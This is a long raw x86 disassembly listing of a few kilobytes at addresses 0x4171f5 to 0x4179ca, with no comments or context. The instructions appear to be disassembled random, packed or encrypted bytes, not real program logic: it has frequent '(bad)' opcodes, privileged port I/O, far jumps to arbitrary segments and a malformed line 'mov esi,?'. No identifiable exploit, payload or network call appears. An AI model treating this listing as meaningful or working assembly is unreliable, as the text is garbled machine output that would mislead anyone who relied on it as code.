  4171f5:	inc    esp
  4171f6:	adc    ebx,DWORD PTR [edi-0x23]
  4171f9:	js     0x4171a5
  4171fb:	dec    ebp
  4171fc:	sbb    ecx,DWORD PTR [edx]
  4171fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171ff:	mov    cl,0x62
  417201:	mov    edx,0xd753bb09
  417206:	xor    al,0x5c
  417208:	cdq    
  417209:	mov    esi,0xcee65d76
  41720e:	dec    ebp
  41720f:	push   edi
  417210:	dec    ecx
  417211:	fucomip st,st(5)
  417213:	ins    BYTE PTR es:[edi],dx
  417214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417215:	sahf   
  417216:	adc    ah,BYTE PTR [ecx-0xc7a087b]
  41721c:	bound  esi,QWORD PTR [edx+0x2e87616d]
  417222:	add    al,0xec
  417224:	clc    
  417225:	in     al,0xe0
  417227:	bsf    ebx,DWORD PTR [ecx+ebx*1+0x35c235]
  41722f:	neg    BYTE PTR [eax]
  417231:	stc    
  417232:	out    0x80,eax
  417234:	cld    
  417235:	test   eax,0x4285854a
  41723a:	out    dx,al
  41723b:	and    al,0x5d
  41723d:	mov    ecx,0x877bbfe1
  417242:	jo     0x4171ed
  417244:	add    eax,0x8f61dc8a
  417249:	daa    
  41724a:	aad    0xf7
  41724c:	sub    dh,BYTE PTR [eax+0x780a4241]
  417252:	sbb    ah,bl
  417254:	call   0x109:0x72badebf
  41725b:	jge    0x4172cb
  41725d:	xchg   ecx,edi
  41725f:	jns    0x4172b9
  417261:	inc    edi
  417262:	or     BYTE PTR [ebp+0x470a57fd],dl
  417268:	sbb    BYTE PTR [ebx+0x7a30935c],bl
  41726e:	stos   BYTE PTR es:[edi],al
  41726f:	iret   
  417270:	nop
  417271:	pusha  
  417272:	mov    ecx,0xcbea5c14
  417277:	aam    0xf
  417279:	xor    DWORD PTR [eax-0x3cc37e8f],ecx
  41727f:	cmp    dh,BYTE PTR [edx+0x4c21d8b6]
  417285:	sbb    eax,0x3af7b6c0
  41728a:	xchg   ebp,eax
  41728b:	jne    0x417263
  41728d:	xchg   esp,eax
  41728e:	dec    esi
  41728f:	test   eax,0x509b81c1
  417294:	push   cs
  417295:	or     bh,ch
  417297:	out    dx,eax
  417298:	(bad)  
  417299:	or     bh,ch
  41729b:	into   
  41729c:	push   edi
  41729d:	sub    edx,esp
  41729f:	hlt    
  4172a0:	mov    ch,0xbf
  4172a2:	sub    eax,0xc672a93d
  4172a7:	inc    eax
  4172a8:	push   eax
  4172a9:	daa    
  4172aa:	(bad)  
  4172ae:	mov    ds:0xd4d80b7c,al
  4172b3:	jnp    0x4172d3
  4172b5:	enter  0x5f8e,0x1c
  4172b9:	les    ebp,FWORD PTR [edi+0x10]
  4172bc:	mov    bh,0xe9
  4172be:	jge    0x41728b
  4172c0:	dec    bp
  4172c2:	or     DWORD PTR [eax-0x5a803b3],ebp
  4172c8:	(bad)
  4172cc:	(bad)  
  4172cd:	cmc    
  4172ce:	dec    edx
  4172cf:	add    eax,0xa4d2bc93
  4172d4:	adc    al,0x85
  4172d6:	pop    ecx
  4172d7:	repz adc BYTE PTR [esi+eiz*8-0x4f65ff94],bh
  4172df:	sbb    BYTE PTR [ecx-0x40],bl
  4172e2:	repnz adc ah,BYTE PTR [ecx+0x6c]
  4172e6:	out    dx,al
  4172e7:	adc    DWORD PTR [esi],0xa8866b07
  4172ed:	(bad)  ds:0xf90afe2b
  4172f3:	xor    bl,BYTE PTR [ecx+0x346b7cbb]
  4172f9:	add    bl,BYTE PTR [edx+0x694bb422]
  4172ff:	xchg   edi,eax
  417300:	mov    ax,ds:0x98bc54a6
  417306:	jg     0x417368
  417308:	fldenv [esi]
  41730a:	cld    
  41730b:	and    eax,ecx
  41730d:	xchg   DWORD PTR [si],edx
  417310:	dec    esi
  417311:	cmp    al,0xce
  417313:	js     0x417317
  417315:	adc    DWORD PTR [esi+eiz*1],ecx
  417318:	sbb    eax,0xbe0f6684
  41731d:	cdq    
  41731e:	shr    BYTE PTR [eax-0x73],cl
  417321:	rcr    BYTE PTR [ebx-0x65975226],cl
  417327:	pop    es
  417328:	fldcw  WORD PTR [edx+0x5c5fc458]
  41732e:	mov    al,0xba
  417330:	xchg   edx,eax
  417331:	inc    ebp
  417332:	mov    al,0xd0
  417334:	mov    ds:0x581cfbbb,al
  417339:	addr16 pop esp
  41733b:	pop    ds
  41733c:	jg     0x417327
  41733e:	ds loope 0x4172dc
  417341:	std    
  417342:	test   BYTE PTR [eax],dh
  417344:	cwde   
  417345:	mov    eax,ds:0x8661c579
  41734a:	sbb    DWORD PTR [edx+0x3e3f4298],ecx
  417350:	mov    ecx,0x9b7c3175
  417355:	imul   DWORD PTR [ecx+ebx*4-0x4d]
  417359:	jne    0x4173d6
  41735b:	repz mov ds:0xf0d3edeb,eax
  417361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417362:	sbb    ch,BYTE PTR [edx-0x726d8769]
  417368:	xchg   edx,eax
  417369:	(bad)  
  41736a:	pop    ss
  41736b:	sahf   
  41736c:	mov    dl,0x5f
  41736f:	ret    0xd892
  417372:	push   ds
  417373:	xchg   edi,eax
  417374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417375:	rcl    BYTE PTR [eax-0x5d08a5ef],0x51
  41737c:	or     al,0x42
  41737e:	jnp    0x41738f
  417380:	cld    
  417381:	retf   
  417382:	in     eax,dx
  417383:	mov    esi,0xa29eb9b1
  417388:	fisubr DWORD PTR [ebx+0x753632ea]
  41738e:	mov    al,0x31
  417390:	scas   al,BYTE PTR es:[edi]
  417391:	or     eax,0x2327d7b7
  417396:	jecxz  0x417403
  417398:	xor    al,0x1e
  41739a:	cs xor al,0xa6
  41739d:	sbb    al,0xe7
  41739f:	pop    ds
  4173a0:	xor    esi,ecx
  4173a2:	stos   DWORD PTR es:[edi],eax
  4173a3:	je     0x4173b8
  4173a5:	hlt    
  4173a6:	shl    DWORD PTR [ecx-0x68],1
  4173a9:	loop   0x4173ae
  4173ab:	ins    DWORD PTR es:[edi],dx
  4173ac:	addr16 call 0x7319cac9
  4173b2:	ds xchg ebx,eax
  4173b4:	fnstenv [ebx*8-0x66371175]
  4173bb:	mov    al,0xbb
  4173bd:	repz sbb BYTE PTR [ebx],cl
  4173c0:	fst    QWORD PTR [eax]
  4173c2:	add    eax,0x60192559
  4173c7:	adc    eax,0xca511b52
  4173cc:	in     eax,dx
  4173cd:	jge    0x41742c
  4173cf:	or     DWORD PTR [ecx+0x398ed7f3],esp
  4173d5:	outs   dx,DWORD PTR ds:[esi]
  4173d6:	add    edx,esi
  4173d8:	sub    al,0xc2
  4173da:	xchg   BYTE PTR [esi-0x32],dh
  4173dd:	shl    DWORD PTR [esi-0x3e],0x24
  4173e1:	mov    bl,0x3a
  4173e3:	das    
  4173e4:	sbb    DWORD PTR [esi],ebx
  4173e6:	sub    dh,bh
  4173e8:	xchg   DWORD PTR [ebx],esp
  4173ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173eb:	adc    ah,BYTE PTR [bx+di]
  4173ee:	cmp    al,0x13
  4173f0:	rol    BYTE PTR [ecx+0x6a],cl
  4173f3:	xchg   esi,eax
  4173f4:	sbb    bh,bh
  4173f6:	in     eax,dx
  4173f7:	pop    ds
  4173f8:	adc    cl,BYTE PTR [ebx]
  4173fa:	mov    edi,0x32cba740
  4173ff:	sub    BYTE PTR [eax],0x58
  417402:	pusha  
  417403:	imul   al
  417405:	jmp    0xd00c06b3
  41740a:	mov    ds:0x3481424e,eax
  41740f:	jle    0x417418
  417411:	mov    dh,0xc7
  417413:	mov    ecx,esi
  417415:	fwait
  417416:	xor    edx,DWORD PTR [eax-0xe]
  417419:	xor    esi,DWORD PTR [edx+0x347142f7]
  41741f:	aas    
  417420:	ins    BYTE PTR es:[edi],dx
  417421:	test   BYTE PTR [ebx-0x11],0xdc
  417425:	popf   
  417426:	mov    dl,0x55
  417428:	pop    ecx
  417429:	out    0xac,al
  41742b:	int3   
  41742c:	mov    dl,0x13
  41742e:	pop    edx
  41742f:	dec    ebx
  417430:	lock pop eax
  417432:	push   eax
  417433:	leave  
  417434:	fstp   DWORD PTR [edi]
  417436:	fs jge 0x4174af
  417439:	loop   0x4173f7
  41743b:	leave  
  41743c:	and    al,0x25
  41743e:	fldcw  WORD PTR [eax-0x76]
  417441:	lock lods eax,DWORD PTR ds:[esi]
  417443:	xchg   edi,eax
  417444:	ret    
  417445:	sbb    ebp,DWORD PTR [eax]
  417447:	add    al,0x28
  417449:	daa    
  41744a:	sbb    cl,BYTE PTR ds:[ebp-0x623e47cf]
  417451:	ja     0x41743a
  417453:	jl     0x417440
  417455:	sbb    DWORD PTR [esi*2-0x361014e0],0x4
  41745d:	mov    bh,0xea
  41745f:	and    bl,al
  417461:	test   DWORD PTR [eax],esi
  417463:	jle    0x41742b
  417465:	mov    dl,0x75
  417467:	add    BYTE PTR [ecx+0x18],bh
  41746a:	je     0x417456
  41746c:	xor    DWORD PTR [ebx+eiz*1-0x6c],esp
  417470:	fwait
  417471:	sti    
  417472:	mov    eax,ds:0xf9932cf8
  417477:	std    
  417478:	retf   0x724e
  41747b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41747c:	mov    cl,dl
  41747e:	dec    edi
  41747f:	je     0x417408
  417481:	std    
  417482:	loop   0x417410
  417484:	retf   0xc783
  417487:	retf   0xa02b
  41748a:	mov    edi,0x9485e9a9
  41748f:	and    BYTE PTR [ebx+0x5ceb3f4],bl
  417495:	retf   0x6fa4
  417498:	ins    DWORD PTR es:[edi],dx
  417499:	sbb    al,0xda
  41749b:	cld    
  41749c:	arpl   WORD PTR [esi],cx
  41749e:	(bad)  
  41749f:	aam    0xf
  4174a1:	rep ins BYTE PTR es:[edi],dx
  4174a3:	and    esp,DWORD PTR [esi]
  4174a5:	js     0x417440
  4174a7:	ins    DWORD PTR es:[edi],dx
  4174a8:	cwde   
  4174a9:	push   ds
  4174aa:	in     al,0xf
  4174ac:	cmc    
  4174ad:	xchg   edi,eax
  4174ae:	mov    eax,ds:0x5089ac21
  4174b3:	inc    ebx
  4174b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b5:	inc    ebp
  4174b6:	dec    edi
  4174b7:	mov    esi,?
  4174b9:	imul   eax,DWORD PTR [eax],0xffffffae
  4174bc:	lods   al,BYTE PTR ds:[esi]
  4174bd:	jb     0x4174e9
  4174bf:	dec    edi
  4174c0:	inc    eax
  4174c1:	int3   
  4174c2:	cmp    dh,al
  4174c4:	push   eax
  4174c5:	movlps QWORD PTR [esi],xmm6
  4174c8:	(bad)  
  4174c9:	fcomip st,st(3)
  4174cb:	add    DWORD PTR [edi],eax
  4174cd:	pop    edi
  4174ce:	fiadd  DWORD PTR [ebp-0x5f372a7a]
  4174d4:	rcl    BYTE PTR [ecx-0x43],1
  4174d7:	sbb    al,0x0
  4174d9:	scas   al,BYTE PTR es:[edi]
  4174da:	fstp   QWORD PTR [edi-0x37]
  4174dd:	sbb    bl,BYTE PTR [esi+esi*2]
  4174e0:	adc    eax,0x199b844d
  4174e5:	addr16 stc 
  4174e7:	div    ebp
  4174e9:	mov    ah,0x31
  4174eb:	cmp    eax,0x223cd940
  4174f0:	pop    ds
  4174f1:	stc    
  4174f2:	sbb    BYTE PTR [esi+0x76],al
  4174f5:	xchg   esp,eax
  4174f6:	jmp    0x4c9b:0x7f176413
  4174fd:	test   dh,bl
  4174ff:	sub    dh,BYTE PTR [edi-0x6b1dcfd]
  417505:	mov    esp,0x4bc4f385
  41750a:	aam    0xc4
  41750c:	and    eax,0xe9bd8ff1
  417511:	out    0x17,al
  417513:	in     al,0x1e
  417515:	cmp    DWORD PTR [ebx+ecx*4+0x791e43d0],0x7d
  41751d:	sbb    ah,dh
  41751f:	call   0x55b9:0xccdf788b
  417526:	xor    eax,0xf19a445e
  41752b:	pop    ebp
  41752c:	push   0x7c
  41752e:	lock outs dx,BYTE PTR ds:[esi]
  417530:	push   0x6a
  417532:	pop    esi
  417533:	fwait
  417534:	(bad)  
  417535:	push   ebp
  417536:	adc    DWORD PTR [eax-0x616db674],ebx
  41753c:	pop    es
  41753d:	xchg   BYTE PTR [ebx+0x3b],al
  417540:	jns    0x417533
  417542:	xor    DWORD PTR [ecx+0x39],ebp
  417545:	sub    bh,bl
  417547:	cmp    DWORD PTR [ebx+ebp*4+0x7f9faa21],esi
  41754e:	mov    ds:0xc75b7854,eax
  417553:	sub    ah,BYTE PTR [edi+0x16]
  417556:	test   al,0x97
  417558:	je     0x4174e1
  41755a:	add    al,0x37
  41755c:	mov    esi,DWORD PTR [esi-0x18357df8]
  417562:	rol    ebx,0xe7
  417565:	dec    ebx
  417566:	int    0xaa
  417568:	fdiv   QWORD PTR ds:0xf0ad0158
  41756e:	sbb    edi,ecx
  417570:	mov    edx,0xa17604c8
  417575:	popa   
  417576:	imul   ebp,DWORD PTR [edi-0x51],0x906533d8
  41757d:	xchg   esp,eax
  41757e:	in     al,dx
  41757f:	xor    ch,dl
  417581:	xor    ebp,DWORD PTR [edi-0x3da34727]
  417587:	out    0x3b,al
  417589:	cdq    
  41758a:	(bad)  [esi-0x56]
  41758d:	pop    edx
  41758e:	(bad)  
  41758f:	int3   
  417590:	lahf   
  417591:	in     eax,dx
  417592:	push   ebx
  417593:	mul    edi
  417595:	and    BYTE PTR [ebx-0x17],ah
  417598:	push   0xffffffc0
  41759a:	xor    al,0xb6
  41759c:	dec    eax
  41759d:	adc    ebp,ecx
  41759f:	mov    edi,0x7d7eb4b8
  4175a4:	sub    bl,BYTE PTR [esi+edi*4-0x6724a4d8]
  4175ab:	mov    edi,0x5d6371ad
  4175b0:	into   
  4175b1:	faddp  st(4),st
  4175b3:	pop    edi
  4175b4:	sub    al,0xeb
  4175b6:	mov    BYTE PTR [esi],cl
  4175b8:	push   esp
  4175b9:	sti    
  4175ba:	out    0x53,al
  4175bc:	repnz cli 
  4175be:	push   ss
  4175bf:	or     al,0xe4
  4175c1:	or     edi,DWORD PTR [esi-0x7f]
  4175c4:	jmp    0xaf5ee25e
  4175c9:	aad    0x86
  4175cb:	mov    eax,ds:0xbc118db9
  4175d0:	inc    ebx
  4175d1:	dec    esp
  4175d2:	jmp    0x9b41:0xe8e53dc4
  4175d9:	test   al,0xfa
  4175db:	dec    ebx
  4175dc:	lds    edx,FWORD PTR [edx+eax*8]
  4175df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e0:	sbb    esp,esi
  4175e2:	push   cs
  4175e3:	stc    
  4175e4:	jmp    0xf6f1:0x384231a4
  4175eb:	mov    BYTE PTR [edi-0x7468bb48],cl
  4175f1:	sahf   
  4175f2:	jno    0x417609
  4175f4:	push   0x26
  4175f6:	dec    ebx
  4175f7:	test   al,0xca
  4175f9:	mov    bh,0x19
  4175fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175fc:	call   0xd280e209
  417601:	mov    ah,BYTE PTR [esi]
  417603:	popf   
  417604:	xor    bh,BYTE PTR [eax]
  417606:	inc    ecx
  417607:	xor    edx,esp
  417609:	loopne 0x417629
  41760b:	sahf   
  41760c:	or     bl,BYTE PTR [edi]
  41760e:	cmp    DWORD PTR [eax-0x65ca19d1],ecx
  417614:	inc    esp
  417615:	fnsave [ebp+0x4e012459]
  41761b:	mov    gs,WORD PTR [ecx+0x7bf128eb]
  417621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417622:	pop    eax
  417623:	gs test eax,0xb1717f9e
  417629:	fld    DWORD PTR [edx+edx*4-0x75]
  41762d:	mov    ah,0xcc
  41762f:	sub    al,0x6e
  417631:	(bad)  
  417632:	aam    0x5b
  417634:	repnz hlt 
  417636:	xchg   ecx,eax
  417637:	cmp    ecx,DWORD PTR ds:0xd52fcf73
  41763d:	fdecstp 
  41763f:	pusha  
  417640:	dec    esp
  417641:	rcl    BYTE PTR [ebx],1
  417643:	inc    edi
  417644:	adc    ebp,DWORD PTR [eax+0x3a4f8916]
  41764a:	gs cld 
  41764c:	imul   esp,eax,0xd7fdadfc
  417652:	das    
  417653:	sti    
  417654:	push   edi
  417655:	xchg   esi,eax
  417656:	outs   dx,BYTE PTR ds:[esi]
  417657:	mov    ah,0x1a
  417659:	inc    edi
  41765a:	mov    edi,0x3784a462
  41765f:	dec    ecx
  417660:	adc    ah,bh
  417662:	ins    DWORD PTR es:[edi],dx
  417663:	sbb    eax,0x3b87d375
  417668:	rol    BYTE PTR [ebp+0x45],cl
  41766b:	rcl    BYTE PTR [esi],0xbe
  41766e:	pusha  
  41766f:	adc    dl,bh
  417671:	sbb    ch,BYTE PTR [ebx-0x4c]
  417674:	sub    dh,ah
  417676:	(bad)  [ebp-0x4954eef1]
  41767c:	inc    edi
  41767d:	mov    ebp,0xa49e6b60
  417682:	jp     0x4c819af1
  417688:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41768a:	mov    al,0xeb
  41768c:	stos   BYTE PTR es:[edi],al
  41768d:	dec    ebx
  41768e:	fistp  WORD PTR [ecx]
  417690:	fdivp  st(2),st
  417692:	jno    0x41762f
  417694:	xlat   BYTE PTR ds:[ebx]
  417695:	gs push esi
  417697:	scas   eax,DWORD PTR es:[edi]
  417698:	mov    edi,0xfbeadefb
  41769d:	or     esp,edx
  41769f:	stc    
  4176a0:	test   DWORD PTR [eax+0x22],edx
  4176a3:	lock in al,0x5e
  4176a6:	test   ah,bl
  4176a8:	sbb    dh,al
  4176aa:	(bad)  
  4176ab:	out    0xff,al
  4176ad:	hlt    
  4176ae:	ins    DWORD PTR es:[edi],dx
  4176af:	jp     0x41768e
  4176b1:	shr    bl,cl
  4176b3:	lods   eax,DWORD PTR ds:[esi]
  4176b4:	xor    DWORD PTR [eax],esi
  4176b6:	popa   
  4176b7:	sahf   
  4176b8:	cdq    
  4176b9:	ud2    
  4176bb:	inc    esp
  4176bc:	fldcw  WORD PTR [edx-0x4af09670]
  4176c2:	sub    cl,cl
  4176c4:	lods   al,BYTE PTR ds:[esi]
  4176c5:	add    dh,cl
  4176c7:	inc    eax
  4176c8:	dec    ebx
  4176c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176ca:	out    dx,al
  4176cb:	jg     0x4176a2
  4176cd:	gs mov ah,ch
  4176d0:	inc    eax
  4176d1:	aam    0x57
  4176d3:	or     ecx,edx
  4176d5:	popa   
  4176d6:	rcl    BYTE PTR [eax],1
  4176d8:	hlt    
  4176d9:	cmp    DWORD PTR [eax+0x2e],ecx
  4176dc:	xchg   BYTE PTR [esi-0x75125e59],dl
  4176e2:	fcom   st(0)
  4176e4:	adc    al,0xa2
  4176e6:	aaa    
  4176e7:	fldcw  WORD PTR [ebx]
  4176e9:	push   ss
  4176ea:	jae    0x41771d
  4176ec:	xlat   BYTE PTR ds:[ebx]
  4176ed:	inc    ecx
  4176ee:	and    DWORD PTR [edx+0x51],ebp
  4176f1:	ret    
  4176f2:	xlat   BYTE PTR ds:[ebx]
  4176f3:	das    
  4176f4:	stos   DWORD PTR es:[edi],eax
  4176f5:	mov    ah,0xba
  4176f7:	xchg   edi,eax
  4176f8:	out    0xbb,al
  4176fa:	popa   
  4176fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176fc:	cdq    
  4176fd:	jle    0x4176c2
  4176ff:	loop   0x4176d8
  417701:	jb     0x4176ba
  417703:	shr    ebx,cl
  417705:	dec    esp
  417706:	mov    esi,0x1c7fc34b
  41770b:	loope  0x41772e
  41770d:	push   0xe19f9cdc
  417712:	inc    eax
  417713:	push   ecx
  417714:	push   ds
  417715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417716:	ret    
  417717:	or     al,0x20
  417719:	cld    
  41771a:	mul    DWORD PTR [ecx+0x42]
  41771d:	mov    edx,0x85d6f06b
  417722:	xchg   edi,eax
  417723:	push   ebx
  417724:	mov    ah,dh
  417726:	cmovns ecx,DWORD PTR [ebp-0x1f026c68]
  41772d:	mov    ecx,0x275a01b5
  417732:	rcl    DWORD PTR [esi-0x59],0x4c
  417736:	sahf   
  417737:	jl     0x417777
  417739:	sub    eax,0x2e7f1169
  41773e:	lahf   
  41773f:	sbb    dh,BYTE PTR [eax+0x61d7d0b0]
  417745:	inc    ebp
  417746:	jnp    0x4176e1
  417748:	fisub  DWORD PTR [eax-0x5beb43a5]
  41774e:	lds    ecx,FWORD PTR [edx]
  417750:	mov    edx,0x60d7fdd7
  417755:	sub    DWORD PTR [edi+0x2],0xaa989276
  41775c:	jmp    0x81a9d243
  417761:	cmp    BYTE PTR [ecx-0x4aeb1e7b],dl
  417767:	and    al,0x44
  417769:	mov    edi,0x4aa89a00
  41776e:	ror    BYTE PTR [ebx+edx*1-0x5c54dd60],0xa2
  417776:	cmp    al,0xd0
  417778:	mov    dl,0x1f
  41777a:	popa   
  41777b:	mov    cl,0x10
  41777d:	dec    ebx
  41777e:	retf   0xc9d4
  417781:	adc    al,0xd3
  417783:	repz (bad) 
  417785:	mov    cl,0xa5
  417787:	in     al,dx
  417788:	sub    esi,ecx
  41778a:	xchg   DWORD PTR [eax],ecx
  41778c:	jge    0x417770
  41778e:	mov    cl,0x9c
  417790:	jae    0x4177dd
  417792:	outs   dx,DWORD PTR ds:[esi]
  417793:	or     DWORD PTR [esi+0x74],ecx
  417796:	jle    0x4177e0
  417798:	cli    
  417799:	push   edx
  41779a:	fidivr WORD PTR [esp+eax*4+0x3a]
  41779e:	lock cld 
  4177a0:	add    DWORD PTR [ebp+0x44aa8781],eax
  4177a6:	ins    BYTE PTR es:[edi],dx
  4177a7:	(bad)  
  4177a9:	cmp    al,dh
  4177ab:	jecxz  0x417755
  4177ad:	mov    ah,0x14
  4177af:	adc    al,0xcb
  4177b1:	cmp    eax,0x57216916
  4177b6:	mov    ebp,0xe4175dd
  4177bb:	cmc    
  4177bc:	xchg   ebx,eax
  4177bd:	xor    DWORD PTR [edi],0x25
  4177c0:	mov    dl,0xb8
  4177c2:	sub    esi,DWORD PTR [ecx]
  4177c4:	inc    ecx
  4177c5:	imul   DWORD PTR [eax+0x20]
  4177c8:	(bad)  
  4177c9:	in     al,dx
  4177ca:	(bad)  
  4177cb:	aaa    
  4177cc:	push   cs
  4177cd:	int3   
  4177ce:	nop    DWORD PTR [eax-0xb]
  4177d2:	pop    es
  4177d3:	pop    ds
  4177d4:	scas   eax,DWORD PTR es:[edi]
  4177d5:	(bad)
  4177d9:	call   0xe83e:0x541fbc98
  4177e0:	jle    0x417861
  4177e2:	ss pusha 
  4177e4:	clc    
  4177e5:	out    0xb,eax
  4177e7:	sbb    eax,0x371e2e40
  4177ec:	lahf   
  4177ed:	mov    ds:0xee04d29f,eax
  4177f2:	lods   eax,DWORD PTR ds:[esi]
  4177f3:	mov    ch,0x9e
  4177f5:	pushf  
  4177f6:	jae    0x41782f
  4177f8:	sbb    ch,BYTE PTR [edi-0x48d46782]
  4177fe:	ins    BYTE PTR es:[edi],dx
  4177ff:	enter  0x60dd,0x34
  417803:	gs mov dh,0xb0
  417806:	mov    esi,0x8393b47c
  41780b:	sub    eax,0xbc713d01
  417810:	mov    dh,0xc2
  417812:	scas   al,BYTE PTR es:[edi]
  417813:	fld    TBYTE PTR fs:[esi+edx*1]
  417817:	icebp  
  417818:	sbb    eax,0x9f9b5b58
  41781d:	int3   
  41781e:	clc    
  41781f:	inc    esi
  417820:	(bad)  
  417821:	loop   0x4177ff
  417823:	dec    esi
  417824:	inc    ebp
  417825:	xor    al,0xd5
  417827:	outs   dx,BYTE PTR ds:[esi]
  417828:	sub    dl,bh
  41782a:	pop    ds
  41782b:	adc    al,0x5
  41782d:	xor    DWORD PTR [eax],edx
  41782f:	sti    
  417830:	and    DWORD PTR [esi-0x25c41206],esi
  417836:	out    dx,eax
  417837:	(bad)  
  417838:	bound  esp,QWORD PTR [edi]
  41783a:	ja     0x4177cd
  41783c:	(bad)  
  41783d:	xor    al,0xc4
  41783f:	mov    al,0x76
  417841:	fisttp WORD PTR [edx+edx*8-0x13]
  417845:	sti    
  417846:	jbe    0x41785c
  417848:	ret    0xd034
  41784b:	es push cs
  41784d:	aaa    
  41784e:	xchg   edi,eax
  41784f:	mov    esp,0x35d902c3
  417854:	xchg   DWORD PTR [edi-0x7ed40380],eax
  41785a:	xchg   ebx,eax
  41785b:	jle    0x41781b
  41785d:	mov    DWORD PTR [esi+0x77],ecx
  417860:	popf   
  417861:	pop    esi
  417862:	add    ebp,DWORD PTR [ecx-0x69]
  417865:	sub    al,0x68
  417867:	clc    
  417868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417869:	cmp    dh,BYTE PTR [edx-0x77e2a5eb]
  41786f:	rol    esp,cl
  417871:	aam    0xa5
  417873:	add    ebx,edx
  417875:	add    dh,BYTE PTR [esp+edx*8-0x14]
  417879:	sahf   
  41787a:	mov    ds:0x8e4983cf,al
  41787f:	dec    esp
  417880:	inc    ecx
  417881:	adc    al,0xe4
  417883:	mov    al,ds:0x76f2175
  417888:	lods   eax,DWORD PTR ds:[esi]
  417889:	fild   QWORD PTR [edx+eax*8]
  41788c:	test   eax,0x3d6e6619
  417891:	mov    ch,0x59
  417893:	fisub  WORD PTR [eax-0x4d0ebefa]
  417899:	retf   
  41789a:	div    DWORD PTR [ebp-0x5d]
  41789d:	scas   eax,DWORD PTR es:[edi]
  41789e:	sbb    BYTE PTR [ecx+ebx*2],dl
  4178a1:	xchg   BYTE PTR [eax-0x35],ch
  4178a4:	push   ds
  4178a5:	pop    ecx
  4178a6:	dec    esi
  4178a7:	fild   QWORD PTR [esi+0x43]
  4178aa:	(bad)  
  4178ab:	mov    esi,ebx
  4178ad:	fcomp  QWORD PTR [edx]
  4178b0:	sbb    ecx,ebp
  4178b2:	add    eax,0xf3be8da4
  4178b7:	mov    ds:0x47c96e90,eax
  4178bc:	and    eax,0xf61dd15e
  4178c1:	(bad)  
  4178c2:	gs retf 
  4178c4:	fcom   QWORD PTR [ebx]
  4178c6:	popf   
  4178c7:	mov    dl,0xff
  4178c9:	mov    eax,ds:0xa5fbddf7
  4178ce:	sub    DWORD PTR [edi+ecx*1+0xaf68852],0x8ec7b3ac
  4178d9:	mov    ebp,DWORD PTR [esp+esi*8+0x585c6ce2]
  4178e0:	xchg   BYTE PTR [edx+eiz*4+0x4cb5acc2],cl
  4178e7:	cdq    
  4178e8:	adc    ebp,DWORD PTR [ecx+esi*8]
  4178eb:	inc    edx
  4178ec:	push   0x23f59082
  4178f1:	xor    BYTE PTR [eax+0x5d9d4d84],al
  4178f7:	dec    ebp
  4178f8:	cmp    BYTE PTR [edx+eax*2+0x324c5eef],dl
  4178ff:	pop    ebx
  417900:	jge    0x4178d9
  417902:	js     0x417932
  417904:	sub    DWORD PTR [eax],esp
  417906:	mov    al,ds:0x9502d2a6
  41790b:	mov    esp,0xe3e1e7
  417910:	xor    DWORD PTR [ecx+0x6b],ebx
  417913:	and    al,0x2
  417915:	inc    ecx
  417916:	adc    eax,0x26528d3
  41791b:	pusha  
  41791c:	mov    dh,0x2c
  41791e:	mov    ecx,0x11038138
  417923:	and    eax,0xc5eb508
  417928:	scas   eax,DWORD PTR es:[edi]
  417929:	xor    ebp,DWORD PTR [edi]
  41792b:	jo     0x417924
  41792d:	dec    edx
  41792e:	inc    eax
  41792f:	dec    edi
  417930:	adc    BYTE PTR [ebx],dl
  417932:	xchg   esp,eax
  417933:	sbb    BYTE PTR [edx+0x32a6688],0x1b
  41793a:	wbinvd 
  41793c:	jge    0x4178c4
  41793e:	and    ch,BYTE PTR [ecx+0x2492a61f]
  417944:	(bad)  
  417945:	ja     0x417996
  417947:	scas   eax,DWORD PTR es:[edi]
  417948:	push   0x291d40ab
  41794d:	ins    BYTE PTR es:[edi],dx
  41794e:	push   edi
  41794f:	sti    
  417950:	add    eax,DWORD PTR [ebp+0x77]
  417953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417954:	adc    esp,DWORD PTR [eax-0x43]
  417957:	test   al,0x45
  417959:	mov    ebp,0x8a860bbc
  41795e:	into   
  41795f:	pop    ebp
  417960:	mov    dh,0x41
  417962:	and    eax,0x1621f0c
  417967:	repz js 0x4179da
  41796a:	std    
  41796b:	(bad)  
  41796c:	(bad)  
  41796d:	push   eax
  41796e:	fs or  eax,0x414f0de3
  417974:	in     eax,dx
  417975:	inc    ebx
  417976:	xchg   ecx,eax
  417977:	(bad)  
  417978:	outs   dx,BYTE PTR ds:[esi]
  417979:	je     0x417960
  41797b:	(bad)  
  41797c:	stos   DWORD PTR es:[edi],eax
  41797d:	jle    0x417995
  41797f:	xor    bl,BYTE PTR [esi-0x4a3d59a3]
  417985:	mov    ebp,0xb5db456c
  41798a:	out    0x98,al
  41798c:	mov    eax,0x3538d284
  417991:	jno    0x4179a4
  417993:	sub    BYTE PTR [esi-0x4a],cl
  417996:	call   0xd5aa121a
  41799b:	js     0x417a1b
  41799d:	push   es
  41799e:	aaa    
  41799f:	fsubr  st(6),st
  4179a1:	mov    bh,0xa4
  4179a3:	or     ah,bh
  4179a5:	xchg   esi,eax
  4179a6:	mov    edx,0xf49db9f
  4179ab:	into   
  4179ac:	inc    ebx
  4179ad:	xor    al,0x3a
  4179af:	cmp    DWORD PTR [ebx+0x38],esi
  4179b2:	push   ebp
  4179b3:	add    BYTE PTR [ecx-0x9e4bcd9],dh
  4179b9:	enter  0xb13c,0x15
  4179bd:	test   DWORD PTR [edi],edx
  4179bf:	test   bh,bh
  4179c1:	jne    0x4179d0
  4179c3:	inc    esi
  4179c4:	aad    0x2c
  4179c6:	mov    gs,ebx
  4179c8:	je     0x417a07
  4179ca:	pop    ebx
